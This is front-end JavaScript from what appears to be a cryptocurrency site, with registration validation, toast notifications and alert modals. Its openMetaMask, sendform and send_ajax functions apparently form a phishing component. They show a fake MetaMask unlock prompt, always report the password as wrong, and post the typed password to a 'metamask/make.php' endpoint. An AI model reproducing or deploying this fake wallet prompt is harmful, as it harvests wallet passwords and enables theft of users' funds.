 function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

  
 

  function disabledBtn(func) {
    if(func == "off") {
      $("#create_account > span").html("Please wait..");
      $("#create_account > i").css("display", "inline-block");
      $("#create_account").css("background", "#242730");
      $("#create_account").attr("disabled", true);

    } else if(func == "on") {
      $("#create_account > span").html("Sign up");
      $("#create_account > i").css("display", "none");
      $("#create_account").css("background", "linear-gradient(90deg, #284EB6 0%, #4C399D 100%)");
      $("#create_account").attr("disabled", false);
    }
  }

  $("#create_account").on("click", function(e) {
    e.preventDefault();
    
    var username = $("#username").val();
    var email = $("#email").val();
    var password = $("#password").val();
    var re_password = $("#re_password").val();
    var get_promo = $("#get_promo").val();

    if(username == '' || username.length < 6) {
      noti("Username must be more than 6 characters", 'warning');
    } else if(email == '' || email.length < 10) {
      noti("Please enter a valid email address", 'warning');
    } else if(password == '' || password.length < 6) {
      noti("Password must be at least 6 characters", 'warning');
    } else if(password != re_password) {
      noti("Passwords do not match, be careful", 'warning');
    } else {
      if ($('.reg-checkbox').is(":checked")) {

        disabledBtn("off");

        $.ajax({
          url: "/ajax/REGISTER_NEW_ACCOUNT",
          type: "POST",
          data: {
            username: username,
            email: email,
            password: password,
            re_password: re_password,
            get_promo: get_promo
          },
          success: function(response) {
            if(response == "1") {
              noti("Account created successfully", "success");
              noti("You will now be redirected to the login page", "info");
              setTimeout(function() {
                location.replace("/profile/wallet");
              }, 1000);
            } else if(response == "2") {
              noti("Username already exists", "error");
              disabledBtn("on");
            } else if(response == "3") {
              noti("Email is Already Registered", "error");
              disabledBtn("on");
            } else if(response == "44") {
              noti("Password must contain at least 6 characters and must be at least 1 uppercase character", "error");
              disabledBtn("on");
            } else if(response == "4") {
              noti("Passwords do not match, be careful", "error");
              disabledBtn("on");
            } else if(response == "5") {
              noti("Multi-account detected!", "error");
              disabledBtn("on");
            } else if(response == "66") {
              noti("There is no such promo", "error");
              disabledBtn("on");
            } else {
              noti("An unexpected error has occurred, please try again", "error");
            }

          }
        })
		
      } else {
        noti("You must agree to our Terms and Conditions", 'warning');
        disabledBtn("on");
      }
    }
	

  });